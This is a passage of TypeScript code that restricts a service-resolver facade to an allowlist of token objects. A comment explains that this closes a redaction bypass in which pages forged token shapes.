  // the redaction bypass, straight back through the facade that was supposed to remove them. Resolving
  // only token objects this module holds closes it: a page can forge the shape but not the identity.
  const allowed: readonly unknown[] = [FiltersToken];
  const resolve = (forward: (token: unknown) => unknown, token: unknown): unknown =>
    allowed.includes(token) ? forward(token) : undefined;
  return {
    getService: (token: unknown): unknown => resolve((t) => resolver.getService(t), token),
    getServiceProvider: (token: unknown): unknown =>
      resolve((t) => resolver.getServiceProvider(t), token),
  };
}
